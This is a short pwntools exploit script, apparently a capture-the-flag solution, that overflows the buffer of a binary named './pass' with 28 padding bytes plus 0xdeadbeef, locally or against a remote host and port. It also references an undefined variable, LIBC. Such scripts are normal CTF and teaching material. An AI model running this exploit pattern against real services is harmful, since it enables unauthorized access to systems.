#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './pass'
LIB = ''
HOST = '140.110.112.77'
PORT = 6125

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIB != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

r.send(b'A'*28 + p32(0xdeadbeef))
r.interactive()
